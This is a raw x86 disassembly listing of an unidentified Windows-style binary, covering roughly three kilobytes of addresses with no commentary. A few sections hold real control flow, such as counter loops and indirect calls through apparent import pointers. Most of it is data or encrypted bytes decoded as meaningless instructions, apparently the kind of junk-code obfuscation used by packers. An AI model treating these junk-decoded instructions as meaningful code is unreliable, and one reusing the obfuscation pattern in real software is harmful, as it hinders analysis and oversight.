  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e927
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e648
  406bcd:	add    DWORD PTR ds:0x4302bd,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42ec4b
  406bdf:	and    edi,DWORD PTR ds:0x430363
  406be5:	mov    DWORD PTR ds:0x42ec4b,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x6b867504
  406bfe:	sbb    sp,WORD PTR [ebp+0x3a]
  406c02:	jle    0x406c82
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c81
  406c09:	fsub   DWORD PTR [ecx]
  406c0b:	imul   DWORD PTR [ebx+0x5f]
  406c0e:	shl    BYTE PTR [esi],cl
  406c10:	xlat   BYTE PTR ds:[ebx]
  406c11:	jae    0x406c39
  406c13:	ins    DWORD PTR es:[edi],dx
  406c14:	mov    eax,ds:0xac7f7366
  406c19:	aam    0x47
  406c1b:	add    bh,ch
  406c1d:	repz bound ecx,QWORD PTR [ecx-0xdc96db9]
  406c24:	dec    edx
  406c25:	sbb    edi,DWORD PTR [ebx]
  406c27:	pop    esi
  406c28:	xor    BYTE PTR [edx],0x30
  406c2b:	add    BYTE PTR [ecx],0x4f
  406c2e:	cli    
  406c2f:	ret    0x421e
  406c32:	cs ja  0x406c1b
  406c35:	cmp    dl,BYTE PTR [ecx+0x333a6d27]
  406c3b:	sbb    eax,0x75e343d3
  406c40:	jl     0x406c72
  406c42:	clc    
  406c43:	or     eax,0xf45ec0b7
  406c48:	sbb    BYTE PTR [esi+0x7],bl
  406c4b:	xor    al,0xb2
  406c4d:	push   ebp
  406c4e:	in     eax,0x31
  406c50:	daa    
  406c51:	fstp   DWORD PTR [esi]
  406c53:	iret   
  406c54:	inc    ebx
  406c55:	daa    
  406c56:	bound  ebx,QWORD PTR [ecx+eiz*1+0x12]
  406c5a:	sahf   
  406c5b:	fsubr  DWORD PTR [ebx-0xe]
  406c5e:	jae    0x406c3b
  406c60:	outs   dx,BYTE PTR ds:[esi]
  406c61:	ret    
  406c62:	inc    ebp
  406c63:	xchg   ecx,eax
  406c64:	in     eax,0xb4
  406c66:	scas   eax,DWORD PTR es:[edi]
  406c67:	std    
  406c68:	stc    
  406c69:	pop    ds
  406c6a:	rcr    eax,0x81
  406c6d:	inc    ebx
  406c6e:	cdq    
  406c6f:	cmp    ebx,DWORD PTR [eax]
  406c71:	out    dx,eax
  406c72:	in     eax,0x81
  406c74:	ficomp WORD PTR [edi+0x6a58e590]
  406c7a:	repnz (bad) 
  406c7c:	shl    DWORD PTR [eax+ebx*1+0x212649b7],1
  406c83:	test   al,0x2e
  406c85:	(bad)  
  406c87:	cwde   
  406c88:	xchg   ecx,eax
  406c89:	clc    
  406c8a:	jae    0x406cd2
  406c8c:	and    esp,DWORD PTR [ecx-0x2a5599ad]
  406c92:	mov    al,BYTE PTR [eax+0x43]
  406c95:	loopne 0x406c9f
  406c97:	lds    eax,FWORD PTR [ecx+0x72662296]
  406c9d:	jbe    0x406d00
  406c9f:	aad    0xda
  406ca1:	mov    eax,0x6949b065
  406ca6:	cmp    dh,dl
  406ca8:	mov    edi,edi
  406caa:	mov    ebx,0x75c0903b
  406caf:	sub    dh,BYTE PTR ds:0xfc07f6f3
  406cb5:	inc    esp
  406cb6:	push   ss
  406cb7:	or     ecx,edi
  406cb9:	adc    eax,0x157f979c
  406cbe:	and    al,0xf7
  406cc0:	fistp  WORD PTR [esi+0x27]
  406cc3:	mov    dh,0x60
  406cc5:	cmp    bh,dh
  406cc7:	fstp   DWORD PTR [ebx+esi*8-0x7016b732]
  406cce:	cmp    eax,0x7db71168
  406cd3:	test   DWORD PTR ds:0x644fcfce,edi
  406cd9:	cmp    ecx,DWORD PTR [edx-0x1c]
  406cdc:	mov    edi,cs
  406cde:	jmp    0x9956:0x146682fa
  406ce5:	dec    esi
  406ce6:	dec    eax
  406ce7:	iret   
  406ce8:	jl     0x406d0d
  406cea:	cmp    eax,0x9709491d
  406cef:	mov    bl,0x52
  406cf1:	les    ebp,FWORD PTR [edx]
  406cf3:	jg     0x406c8e
  406cf5:	aam    0x12
  406cf7:	test   al,0xe4
  406cf9:	xor    ch,bl
  406cfb:	les    eax,FWORD PTR fs:[eax-0x51184520]
  406d02:	stc    
  406d03:	les    ebp,FWORD PTR [edi]
  406d05:	xchg   esp,eax
  406d06:	xchg   esi,eax
  406d07:	dec    esp
  406d08:	adc    edi,ebx
  406d0a:	fdiv   QWORD PTR [ecx+ebp*1]
  406d0d:	(bad)  
  406d0e:	jmp    0x8d868f9b
  406d13:	jg     0x406cfc
  406d15:	les    ebx,FWORD PTR [edi-0x3c]
  406d18:	lahf   
  406d19:	out    dx,al
  406d1a:	adc    al,0xf7
  406d1c:	imul   edx,DWORD PTR [edi],0xffffffcb
  406d1f:	inc    eax
  406d20:	xor    eax,0xcaf29627
  406d25:	cmp    BYTE PTR [edi-0x42d15ff9],bl
  406d2b:	cs xor eax,0x2c9e2652
  406d31:	adc    al,0xdc
  406d33:	push   es
  406d34:	jmp    0x9157:0x4dc4f683
  406d3b:	add    esi,DWORD PTR [ecx+0x10]
  406d3e:	push   0xffffffde
  406d40:	mov    al,ds:0xeb58aeb0
  406d45:	xchg   esp,eax
  406d46:	popf   
  406d47:	ret    0x82b9
  406d4a:	xor    al,0x9f
  406d4c:	repnz inc esp
  406d4e:	arpl   si,bx
  406d50:	push   edx
  406d51:	pusha  
  406d52:	bound  esi,QWORD PTR [edx]
  406d54:	scas   eax,DWORD PTR es:[edi]
  406d55:	mov    ebx,0x39fb1488
  406d5a:	push   esi
  406d5b:	xchg   ebx,eax
  406d5c:	fadd   QWORD PTR [esi+0x1930cc06]
  406d62:	mov    dl,0x81
  406d64:	retf   0xb3b1
  406d67:	adc    eax,0x2f8420ac
  406d6c:	test   BYTE PTR [ebx-0x343cbf2a],ch
  406d72:	(bad)  
  406d73:	mov    ah,0xe3
  406d75:	mov    edi,0xaeba4944
  406d7a:	pop    eax
  406d7b:	in     eax,0x68
  406d7d:	xchg   ebp,eax
  406d7e:	outs   dx,BYTE PTR ds:[esi]
  406d7f:	arpl   WORD PTR [ecx+0xa1b10f4],sp
  406d85:	fsubr  QWORD PTR [edx-0x15e9743a]
  406d8b:	dec    edx
  406d8c:	mov    eax,ds:0xbca39ac5
  406d91:	add    al,0x56
  406d93:	pop    edi
  406d94:	cld    
  406d95:	data16 stos BYTE PTR es:[edi],al
  406d97:	in     al,dx
  406d98:	push   cs
  406d99:	jns    0x406df9
  406d9b:	add    al,0x3
  406d9d:	rol    DWORD PTR [ecx+0x43035f25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x43035f3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x43035f
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x2f477b7b],si
  406e0c:	pusha  
  406e0d:	xor    ebx,esi
  406e0f:	icebp  
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e81
  406e18:	add    al,0x53
  406e1a:	pop    ss
  406e1b:	aas    
  406e1c:	add    BYTE PTR [ecx],ah
  406e1e:	call   0x5bb883b0
  406e23:	(bad)  
  406e24:	mov    edi,0xfe7ced4b
  406e29:	and    eax,0x4888d964
  406e2e:	(bad)  
  406e2f:	mov    edx,0x98762443
  406e34:	xchg   ebp,eax
  406e35:	out    dx,eax
  406e36:	fsub   QWORD PTR [esi-0x4c0b9c98]
  406e3c:	push   ebx
  406e3d:	in     al,dx
  406e3e:	push   ebx
  406e3f:	jb     0x406e69
  406e41:	(bad)  [ebp+0x74be32b5]
  406e47:	mov    ah,0x49
  406e49:	mov    eax,ds:0xfca41532
  406e4e:	mov    ah,0x80
  406e50:	mov    ebx,0xc3208358
  406e55:	in     eax,dx
  406e56:	adc    BYTE PTR [edx-0x66],cl
  406e59:	dec    esp
  406e5a:	push   edx
  406e5b:	ret    0xc970
  406e5e:	xchg   DWORD PTR [ecx+edi*4+0x6d],esp
  406e62:	mov    al,0x59
  406e64:	pushf  
  406e65:	xchg   ah,dl
  406e67:	jp     0x406eb9
  406e69:	adc    eax,0x1d125238
  406e6e:	lods   eax,DWORD PTR ds:[esi]
  406e6f:	and    DWORD PTR [esi+0x906342e],ecx
  406e75:	inc    esi
  406e76:	sti    
  406e77:	xchg   ebx,eax
  406e78:	mov    eax,fs:0xf971cfe2
  406e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7f:	fisttp DWORD PTR [edi-0x60b3ad52]
  406e85:	out    0xf7,eax
  406e87:	xchg   ebp,eax
  406e88:	jns    0x406eef
  406e8a:	push   ebp
  406e8b:	int    0x33
  406e8d:	(bad)  
  406e8e:	retf   
  406e8f:	adc    DWORD PTR [edi-0x20ec3492],esp
  406e95:	adc    al,0x1e
  406e97:	or     cl,bh
  406e99:	dec    esi
  406e9a:	ins    BYTE PTR es:[edi],dx
  406e9b:	mov    esp,0x6c4afd86
  406ea0:	pop    edi
  406ea1:	jne    0x406e69
  406ea3:	or     esp,ebp
  406ea5:	adc    edi,DWORD PTR [edi-0x52b784f4]
  406eab:	ja     0x406eda
  406ead:	(bad)  
  406eaf:	mov    DWORD PTR [ebx-0x52e7e173],esi
  406eb5:	xchg   edx,eax
  406eb6:	xor    eax,0xb60ddbce
  406ebb:	and    al,0x21
  406ebd:	arpl   cx,bx
  406ebf:	test   edi,ecx
  406ec1:	mov    edi,DWORD PTR [ecx-0x41]
  406ec4:	add    DWORD PTR [eax-0x7dad2c46],0xffffff8d
  406ecb:	repnz add cl,0x22
  406ecf:	jne    0x406eb6
  406ed1:	or     bh,bl
  406ed3:	jo     0x406f49
  406ed5:	dec    eax
  406ed6:	dec    ebp
  406ed7:	ins    BYTE PTR es:[edi],dx
  406ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ed9:	pop    ss
  406eda:	stc    
  406edb:	cli    
  406edc:	pop    esp
  406edd:	mov    cl,bl
  406edf:	mov    ch,ah
  406ee1:	(bad)  
  406ee3:	jle    0x406e67
  406ee5:	push   ss
  406ee6:	pop    esp
  406ee7:	inc    ebx
  406ee8:	in     al,0xe4
  406eea:	jns    0x406f3b
  406eec:	inc    esi
  406eed:	imul   eax,DWORD PTR [ecx],0x5b
  406ef0:	pop    ss
  406ef1:	push   ebx
  406ef2:	fdivr  QWORD PTR [eax-0x732dde11]
  406ef8:	cmp    BYTE PTR [esi-0x66a2372f],al
  406efe:	pushf  
  406eff:	push   cs
  406f00:	jbe    0x406f2e
  406f02:	std    
  406f03:	fiadd  DWORD PTR [edi]
  406f05:	sub    dh,0xa4
  406f08:	dec    edi
  406f09:	loopne 0x406ef0
  406f0b:	push   0xffffffd4
  406f0d:	inc    eax
  406f0e:	ds cli 
  406f10:	mov    cl,0x43
  406f12:	in     al,0x2
  406f14:	sub    al,0xec
  406f16:	cmp    BYTE PTR [esi+0x10249af4],dh
  406f1c:	pop    eax
  406f1d:	push   ebx
  406f1e:	cmp    DWORD PTR [edi+0x35ba67ae],esi
  406f24:	sbb    DWORD PTR [edi+0x4a],edx
  406f27:	aam    0xaa
  406f29:	cli    
  406f2a:	(bad)  
  406f2b:	mov    bh,0x5a
  406f2d:	dec    ebp
  406f2e:	jl     0x406ee8
  406f30:	xchg   esi,eax
  406f31:	lods   eax,DWORD PTR ds:[esi]
  406f32:	stc    
  406f33:	(bad)  
  406f34:	lods   al,BYTE PTR ds:[esi]
  406f35:	xchg   ebp,eax
  406f36:	ss dec ecx
  406f38:	mov    ebx,0x62684d95
  406f3d:	mov    WORD PTR [ecx-0x7c],cs
  406f40:	adc    ebp,DWORD PTR [esi]
  406f42:	jmp    0xd0fb6348
  406f47:	loopne 0x406fc7
  406f49:	jbe    0x406f19
  406f4b:	cmp    al,0xfa
  406f4d:	push   eax
  406f4e:	test   eax,0x8635191a
  406f53:	xchg   edi,eax
  406f54:	repnz or BYTE PTR [ebp-0x2f181d0b],bl
  406f5b:	out    dx,eax
  406f5c:	ds adc esi,0xffffff92
  406f60:	retf   0xe32e
  406f63:	lahf   
  406f64:	and    ebp,ebx
  406f66:	mov    ebp,0x94715722
  406f6b:	cmp    eax,0xd3dc9362
  406f70:	in     eax,dx
  406f71:	xor    al,0xf4
  406f73:	inc    esi
  406f74:	jl     0x406fd4
  406f76:	(bad)  
  406f77:	out    0xeb,al
  406f79:	ret    
  406f7a:	lock xor DWORD PTR [esp+esi*1],ebx
  406f7e:	jb     0x406f75
  406f80:	out    0xb4,eax
  406f82:	xlat   BYTE PTR ds:[ebx]
  406f83:	xchg   ebp,eax
  406f84:	hlt    
  406f85:	fcom   QWORD PTR [ebx]
  406f87:	scas   al,BYTE PTR es:[edi]
  406f88:	stos   BYTE PTR es:[edi],al
  406f89:	adc    ecx,DWORD PTR [ecx-0x3d]
  406f8c:	fdiv   DWORD PTR ds:0xbe4a4fbc
  406f92:	shl    ecx,0xf3
  406f95:	lods   eax,DWORD PTR ds:[esi]
  406f96:	xor    ecx,DWORD PTR [edi]
  406f98:	pop    es
  406f99:	push   cs
  406f9a:	(bad)  
  406f9b:	bnd ret 
  406f9d:	or     cl,ah
  406f9f:	xchg   ebp,eax
  406fa0:	ds popf 
  406fa2:	jne    0x406fe4
  406fa4:	ror    BYTE PTR [edi],0xda
  406fa7:	xchg   BYTE PTR [eax+0x5589189b],dh
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x381c3d82,edx
  406fd4:	push   ds
  406fd5:	jmp    0x7ebf35e7
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x406fee
  406fdf:	daa    
  406fe0:	sub    DWORD PTR [edx-0x6a],esi
  406fe3:	cmp    dl,BYTE PTR [ecx-0x2a]
  406fe6:	inc    DWORD PTR [ecx]
  406fe8:	out    dx,al
  406fe9:	push   ds
  406fea:	pop    ds
  406feb:	add    eax,0x74562415
  406ff0:	push   edx
  406ff1:	jae    0x406fb1
  406ff3:	retf   0x40b6
  406ff6:	in     eax,dx
  406ff7:	mov    dh,0x16
  406ff9:	jne    0x40702f
  406ffb:	cdq    
  406ffc:	jle    0x407001
  406ffe:	aam    0xe2
  407000:	retf   0x3261
  407003:	ins    DWORD PTR es:[edi],dx
  407004:	jecxz  0x407069
  407006:	sahf   
  407007:	cmp    edx,ecx
  407009:	lods   eax,DWORD PTR ds:[esi]
  40700a:	pop    ebp
  40700b:	jg     0x407080
  40700d:	jmp    0xd3ecd61a
  407012:	push   esp
  407013:	sub    ebp,DWORD PTR [edx]
  407015:	pop    edx
  407016:	or     al,0xf5
  407018:	push   esi
  407019:	or     esi,DWORD PTR [ecx]
  40701b:	inc    ebx
  40701c:	mov    eax,ds:0xb2622128
  407021:	test   edx,0xf274e987
  407027:	imul   edi,DWORD PTR [edi+0x1ed521ca],0xffffffc6
  40702e:	and    eax,0xac1b3920
  407033:	shl    BYTE PTR [eax-0x4211c254],1
  407039:	in     eax,dx
  40703a:	scas   eax,DWORD PTR es:[edi]
  40703b:	gs pop ebx
  40703d:	jg     0x407006
  40703f:	addr16 pop es
  407041:	in     eax,0xd
  407043:	lock je 0x407094
  407046:	pop    es
  407047:	xchg   esp,eax
  407048:	cmp    al,0x2a
  40704a:	xlat   BYTE PTR ds:[ebx]
  40704b:	test   DWORD PTR [ebx],ebx
  40704d:	popf   
  40704e:	gs mov ecx,0xe5438883
  407054:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407056:	nop
  407057:	aam    0xc8
  407059:	retf   0xe656
  40705c:	sbb    BYTE PTR [esi+eiz*8],dh
  40705f:	inc    eax
  407060:	cwde   
  407061:	xor    BYTE PTR [edi+0x6a1bb892],al
  407067:	mov    esp,DWORD PTR [esi]
  407069:	push   0x1da9bcdd
  40706e:	pop    esp
  40706f:	jl     0x407044
  407071:	pop    eax
  407072:	or     BYTE PTR ds:0xbd884df0,0xd2
  407079:	cmp    al,0xb2
  40707b:	sub    BYTE PTR [ebp-0x69],dh
  40707e:	addr16 (bad) 
  407080:	push   esp
  407081:	je     0x40708e
  407083:	pop    ebp
  407084:	int3   
  407085:	jb     0x407010
  407087:	hlt    
  407088:	add    BYTE PTR [ecx-0x6e014e0b],0x9b
  40708f:	call   0x2905:0x9561a17d
  407096:	xchg   ecx,eax
  407097:	push   ebp
  407098:	test   BYTE PTR [esi-0x2a],dl
  40709b:	iret   
  40709c:	imul   esp,eax,0xcbfa1def
  4070a2:	in     eax,dx
  4070a3:	pop    ecx
  4070a4:	loope  0x407119
  4070a6:	retf   0x8ae6
  4070a9:	bound  edi,QWORD PTR [eax-0x69b55f86]
  4070af:	ret    0x7daf
  4070b2:	std    
  4070b3:	daa    
  4070b4:	mov    ebx,0xe9b48650
  4070b9:	jmp    0x2fd3db28
  4070be:	dec    eax
  4070bf:	shl    DWORD PTR [ebx+eax*8],1
  4070c2:	dec    ecx
  4070c3:	mov    esp,DWORD PTR [edx+0x7f15834b]
  4070c9:	mov    eax,0x61ee1558
  4070ce:	rcl    DWORD PTR [edx-0x25944ab],cl
  4070d4:	xor    al,0x33
  4070d6:	add    al,0xf
  4070d8:	jo     0x40705f
  4070da:	mov    bl,0xf9
  4070dc:	lds    esp,FWORD PTR [esi-0x1efcd38b]
  4070e2:	aad    0x77
  4070e4:	aad    0x2b
  4070e6:	add    al,0x1c
  4070e8:	pop    ss
  4070e9:	dec    edi
  4070ea:	(bad)  
  4070eb:	sahf   
  4070ec:	mov    esi,0xcb75ed19
  4070f1:	xor    al,0x4d
  4070f3:	cmp    eax,0xde0ae076
  4070f8:	gs out 0x5d,eax
  4070fb:	xchg   esi,eax
  4070fc:	inc    ebx
  4070fd:	retf   
  4070fe:	aad    0x65
  407100:	std    
  407101:	(bad)  
  407102:	popa   
  407103:	daa    
  407104:	jp     0x407104
  407106:	bound  edx,QWORD PTR [edi+0x18]
  407109:	cmp    BYTE PTR [ebp-0x792a5ab8],bl
  40710f:	sbb    bl,ch
  407111:	in     eax,dx
  407112:	and    eax,0x2fd54921
  407117:	stc    
  407118:	icebp  
  407119:	mov    esi,DWORD PTR [edi+eiz*4]
  40711c:	or     DWORD PTR [edx+ebx*1-0x60],esp
  407120:	(bad)  
  407121:	call   0x5aab7fec
  407126:	fidivr WORD PTR [ebx]
  407128:	cmp    BYTE PTR [esi],dl
  40712a:	inc    edi
  40712b:	and    esp,DWORD PTR [ebx]
  40712d:	icebp  
  40712e:	and    eax,0x92abb8c8
  407133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407134:	cmp    eax,ebp
  407136:	sub    al,0x8d
  407138:	fwait
  407139:	push   edx
  40713a:	inc    eax
  40713b:	jb     0x40718f
  40713d:	pop    esi
  40713e:	pusha  
  40713f:	data16 int3 
  407141:	(bad)  
  407142:	mov    ah,0xec
  407144:	pop    edx
  407145:	or     BYTE PTR [ecx-0x23],bh
  407148:	ins    BYTE PTR es:[edi],dx
  407149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40714a:	hlt    
  40714b:	adc    bl,BYTE PTR [edi]
  40714d:	adc    edi,DWORD PTR [eax]
  40714f:	xor    ebp,DWORD PTR [eax]
  407151:	fdiv   QWORD PTR [edi]
  407153:	jg     0x407121
  407155:	and    al,0x7
  407157:	lods   eax,DWORD PTR ds:[esi]
  407158:	push   ecx
  407159:	adc    al,0xfa
  40715b:	icebp  
  40715c:	ja     0x4071dc
  40715e:	pop    ebx
  40715f:	or     al,0xc7
  407161:	push   esp
  407162:	xor    ah,bl
  407164:	bndldx (bad),[edi+eax*4+0x2567d23]
  40716c:	icebp  
  40716d:	hlt    
  40716e:	sbb    al,0x75
  407170:	shl    BYTE PTR [ecx+ecx*4],1
  407173:	push   ebp
  407174:	or     al,0x81
  407176:	and    eax,0x42e640
  40717b:	add    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [eax],al
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x3c353f15
  4072a7:	add    edx,DWORD PTR [esi-0x67]
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407237
  4072b2:	mov    ds:0xf938d548,eax
  4072b7:	cmp    BYTE PTR [edx],0xd4
  4072ba:	pushf  
  4072bb:	ds jmp 0xccfa:0xc887661
  4072c3:	jae    0x4072ac
  4072c5:	pop    ds
  4072c6:	mov    ch,0x9
  4072c8:	(bad)  
  4072c9:	sahf   
  4072ca:	scas   eax,DWORD PTR es:[edi]
  4072cb:	(bad)  
  4072cd:	dec    edx
  4072ce:	stos   BYTE PTR es:[edi],al
  4072cf:	mov    edx,0x71f70634
  4072d4:	push   eax
  4072d5:	mov    dh,0xe5
  4072d7:	addr16 pop ecx
  4072d9:	ficomp DWORD PTR [eax-0x19]
  4072dc:	imul   esi,DWORD PTR [eax-0x34],0xffffffbb
  4072e0:	mov    WORD PTR [ebp+0x26],fs
  4072e3:	test   al,0x45
  4072e5:	cmp    eax,0xb048df1a
  4072ea:	mov    edi,0x8addfff8
  4072ef:	sti    
  4072f0:	push   ebx
  4072f1:	mov    eax,0x57a6f863
  4072f6:	push   ecx
  4072f7:	scas   eax,DWORD PTR es:[edi]
  4072f8:	cmp    eax,0xf5f57465
  4072fd:	xchg   esi,eax
  4072fe:	adc    BYTE PTR [eax-0x9],ch
  407301:	jmp    DWORD PTR [edx+0x7d]
  407304:	jmp    0xe04bb326
  407309:	xchg   cl,ah
  40730b:	aad    0x57
  40730d:	fstp   TBYTE PTR [ecx]
  40730f:	pop    ecx
  407310:	fdivp  st(7),st
  407312:	call   0x3512:0x5ab5975c
  407319:	rcl    esi,0x63
  40731c:	pop    edi
  40731d:	push   ss
  40731e:	out    dx,eax
  40731f:	(bad)  
  407320:	jge    0x4072fa
  407322:	addr16 jbe 0x407314
  407325:	mov    BYTE PTR [ecx+0x61d608f1],cl
  40732b:	popf   
  40732c:	jl     0x4072f6
  40732e:	add    al,0x94
  407330:	das    
  407331:	aam    0xfb
  407333:	xchg   BYTE PTR [ebp+0x3d],al
  407336:	or     DWORD PTR [edi+ecx*1+0x329ae63b],esp
  40733d:	inc    ebp
  40733e:	mov    bl,0x5
  407340:	adc    edx,ebx
  407342:	stc    
  407343:	dec    edx
  407344:	adc    eax,DWORD PTR [edi]
  407346:	and    al,0x6a
  407348:	jo     0x4073a5
  40734a:	mov    ebp,0x11fec6b9
  40734f:	lods   eax,DWORD PTR ds:[esi]
  407350:	mov    edi,0xc9045883
  407355:	imul   edi,DWORD PTR [ebp-0x72],0x4e
  407359:	push   eax
  40735a:	inc    edi
  40735b:	and    eax,0x3f905cf4
  407360:	adc    DWORD PTR ds:[eax],eax
  407363:	mov    dh,BYTE PTR [ecx-0x1e]
  407366:	inc    ebp
  407367:	call   0xc71d51c
  40736c:	repnz mov bh,0xcf
  40736f:	retf   0x3006
  407372:	int3   
  407373:	cli    
  407374:	cmp    edi,ebp
  407376:	retf   
  407377:	out    0x76,eax
  407379:	and    al,0x26
  40737b:	loop   0x4073a4
  40737d:	aas    
  40737e:	sti    
  40737f:	add    BYTE PTR [ebp-0x9],cl
  407382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407383:	lds    ebx,FWORD PTR [ecx-0x3c31081e]
  407389:	mov    esi,0x51690ee7
  40738e:	repz loope 0x4073bf
  407391:	dec    edx
  407392:	push   edi
  407393:	ins    BYTE PTR es:[edi],dx
  407394:	iret   
  407395:	aaa    
  407396:	adc    BYTE PTR [edx],bl
  407398:	xor    eax,0xb3bc5702
  40739d:	sbb    al,0x2
  40739f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073a0:	gs into 
  4073a2:	mov    edx,0xc1434151
  4073a7:	cmc    
  4073a8:	fwait
  4073a9:	dec    ecx
  4073aa:	mov    esp,0x8be78d5b
  4073af:	sub    ebx,eax
  4073b1:	mov    al,0x56
  4073b3:	cld    
  4073b4:	pop    ecx
  4073b5:	pushf  
  4073b6:	pop    es
  4073b7:	mov    ecx,0x36be665d
  4073bc:	lods   al,BYTE PTR ds:[esi]
  4073bd:	cmp    ecx,DWORD PTR ds:0x236c2a03
  4073c3:	or     al,0x8c
  4073c5:	mov    edx,0x64075df8
  4073ca:	cmp    eax,eax
  4073cc:	inc    edx
  4073cd:	imul   eax,DWORD PTR [esi+esi*4],0xab9f2f08
  4073d4:	push   ds
  4073d5:	push   0x3baea9e1
  4073da:	lea    edi,[edi]
  4073dc:	add    DWORD PTR [ebx+0x4d68f26d],ebx
  4073e2:	mov    cl,0x19
  4073e4:	push   ebx
  4073e5:	jecxz  0x407376
  4073e7:	xchg   edi,eax
  4073e8:	fidivr DWORD PTR [ebx]
  4073ea:	lock mov ecx,DWORD PTR [ecx+eiz*1+0x4f466083]
  4073f2:	sbb    al,0xf6
  4073f4:	pop    eax
  4073f5:	fdivr  QWORD PTR [ecx+0x19]
  4073f8:	jmp    0xde64438d
  4073fd:	adc    eax,0x7175b4f5
  407402:	mov    edi,0x8c0a6d53
  407407:	push   es
  407408:	adc    esi,ebx
  40740a:	test   BYTE PTR [ebp+0x67ed51a4],bl
  407410:	jmp    0x8a51:0x5e6aeed2
  407417:	and    eax,ecx
  407419:	ins    BYTE PTR es:[edi],dx
  40741a:	mov    eax,ds:0x5d2ff09b
  40741f:	adc    BYTE PTR [esi],ah
  407421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407422:	nop
  407423:	repnz xchg ecx,eax
